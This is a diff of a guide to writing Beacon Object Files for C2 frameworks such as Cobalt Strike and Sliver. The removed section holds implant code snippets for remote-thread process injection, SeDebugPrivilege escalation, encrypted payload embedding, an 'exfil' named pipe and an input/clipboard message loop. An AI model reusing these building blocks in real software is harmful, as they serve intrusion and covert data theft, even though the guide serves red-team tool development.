@@ -139,7 +139,7 @@ BOFs can use Beacon's built-in syscall mechanism (indirect syscalls).
 
 ```c
 BEACON_SYSCALLS sc;
-BeaconGetSyscallInformation(&sc, sizeof(sc), TRUE);
+BeaconGetSyscallInformation(&sc, sizeof(sc));
 // Access: sc.syscalls.ntAllocateVirtualMemory.fnAddr, .jmpAddr, .sysnum
 ```
 
@@ -262,176 +262,23 @@ COFFLoader.exe mybof.o
 
 ---
 
-## 14. Real-world patterns reference
+## 14. Framework-specific loader notes
 
-### 14.1 DFR import grouping convention
+### Cobalt Strike
 
-Always group DFR declarations by DLL module with section headers:
+- CNA integration via `beacon_inline_execute()` and `bof_pack()`
+- CS 4.9+: Key/Value Store (`BeaconAddValue`/`GetValue`/`RemoveValue`)
+- CS 4.10+: Syscall API (`BeaconGetSyscallInformation`, `BeaconVirtualAllocEx`, etc.)
+- CS 4.11+: BeaconGate for intercepting API calls via Sleep Mask
 
-```c
-/* ── KERNEL32 ─────────────────────────────────────────── */
-DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
-DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
+### Sliver
 
-/* ── ADVAPI32 ─────────────────────────────────────────── */
-DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
+- Requires both x64 and x86 object files in extension bundle
+- Uses `extension.json` manifest instead of CNA
+- DFR convention identical (`MODULE$Function`)
 
-/* ── NTDLL ────────────────────────────────────────────── */
-DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
+### Havoc / Brute Ratel / other COFF loaders
 
-/* ── MSVCRT ───────────────────────────────────────────── */
-DECLSPEC_IMPORT int     __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
-```
-
-Module order: KERNEL32 → ADVAPI32 → NTDLL → USER32 → MSVCRT → others.
-Align return types for readability.
-
-### 14.2 Heap management (HeapAlloc / HeapFree)
-
-Never use `malloc`/`free`/`calloc` in BOFs. Use the process heap:
-
-```c
-HANDLE heap = KERNEL32$GetProcessHeap();
-void* buf = KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, size);
-/* ... */
-KERNEL32$HeapFree(heap, 0, buf);
-```
-
-### 14.3 Multi-mode BOF design
-
-Single BOF source, multiple operations via mode integer:
-
-```c
-#define MODE_FREEZE   1
-#define MODE_DUMP     2
-#define MODE_UNFREEZE 3
-
-void go(char* args, int len) {
-    datap parser;
-    BeaconDataParse(&parser, args, len);
-    int mode = BeaconDataInt(&parser);
-    switch (mode) {
-        case MODE_FREEZE:   do_freeze(&parser);   break;
-        case MODE_DUMP:     do_dump(&parser);      break;
-        case MODE_UNFREEZE: do_unfreeze(&parser);  break;
-        default: BeaconPrintf(CALLBACK_ERROR, "Unknown mode: %d", mode);
-    }
-}
-```
-
-### 14.4 Key/Value Store for persistent state (CS 4.9+)
-
-```c
-#define KEY_HANDLE "myBof_handle"
-BeaconAddValue(KEY_HANDLE, (char*)hProc);            /* store */
-HANDLE h = (HANDLE)BeaconGetValue(KEY_HANDLE);       /* retrieve */
-BeaconRemoveValue(KEY_HANDLE);                       /* cleanup */
-```
-
-### 14.5 Ntdll dynamic resolution via GetProcAddress
-
-```c
-typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);
-HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
-fnNtSuspendProcess pSuspend =
-    (fnNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");
-```
-
-### 14.6 Embedded encrypted payloads
-
-```c
-#include "payload.h"  /* enc_payload[], enc_key[], enc_nonce[] */
-
-static void secure_zero(void* ptr, size_t len) {
-    volatile unsigned char* p = (volatile unsigned char*)ptr;
-    while (len--) *p++ = 0;
-}
-/* Decrypt → use → secure_zero key material */
-```
-
-### 14.7 Process injection (VirtualAllocEx → WriteProcessMemory → CreateRemoteThread)
-
-```c
-LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, sz,
-    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, sz, NULL);
-DWORD oldProt;
-KERNEL32$VirtualProtectEx(hProc, remoteBuf, sz, PAGE_EXECUTE_READ, &oldProt);
-HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
-    (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
-```
-
-### 14.8 Named pipe IPC for data exchange
-
-```c
-wchar_t pipeName[128];
-MSVCRT$_snwprintf(pipeName, 128, L"\\\\.\\pipe\\exfil_%d", pid);
-HANDLE hPipe = KERNEL32$CreateNamedPipeW(pipeName,
-    PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_WAIT,
-    1, 0, BUFFER_SIZE, 0, NULL);
-KERNEL32$ConnectNamedPipe(hPipe, NULL);
-```
-
-### 14.9 Error handling helpers
-
-```c
-static void PrintWin32Error(const char* ctx) {
-    DWORD e = KERNEL32$GetLastError();
-    BeaconPrintf(CALLBACK_ERROR, "%s failed (error %lu / 0x%lX)", ctx, e, e);
-}
-
-static BOOL EnableDebugPrivilege(void) {
-    HANDLE hToken;
-    ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
-        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-    TOKEN_PRIVILEGES tp;
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
-        &tp.Privileges[0].Luid);
-    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
-    KERNEL32$CloseHandle(hToken);
-    return ok;
-}
-```
-
-### 14.10 Custom struct definitions
-
-When SDK headers are unavailable or too heavy:
-
-```c
-#pragma pack(push, 1)
-typedef struct _MY_SYSTEM_PROCESS_INFO {
-    ULONG  NextEntryOffset;
-    ULONG  NumberOfThreads;
-    UNICODE_STRING ImageName;
-    LONG   BasePriority;
-    HANDLE UniqueProcessId;
-} MY_SYSTEM_PROCESS_INFO;
-#pragma pack(pop)
-```
-
-### 14.11 Long-running BOF (message pump)
-
-```c
-static BOOL g_running = TRUE;
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
-    /* handle WM_INPUT, WM_CLIPBOARDUPDATE, etc. */
-    if (msg == WM_DESTROY) { g_running = FALSE; return 0; }
-    return USER32$DefWindowProcW(hwnd, msg, wp, lp);
-}
-void go(char* args, int len) {
-    (void)args; (void)len;
-    WNDCLASSW wc = {0};
-    wc.lpfnWndProc = WndProc;
-    wc.lpszClassName = L"BofWorker";
-    USER32$RegisterClassW(&wc);
-    HWND hwnd = USER32$CreateWindowExW(0, L"BofWorker", NULL, 0,
-        0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);
-    MSG msg;
-    while (g_running && USER32$GetMessageW(&msg, NULL, 0, 0) > 0) {
-        USER32$TranslateMessage(&msg);
-        USER32$DispatchMessageW(&msg);
-    }
-}
-```
+- DFR convention is universal across BOF-compatible loaders
+- Some loaders may not support all Beacon API functions (KV store, syscall wrappers)
+- Always test with the target loader before assuming API availability
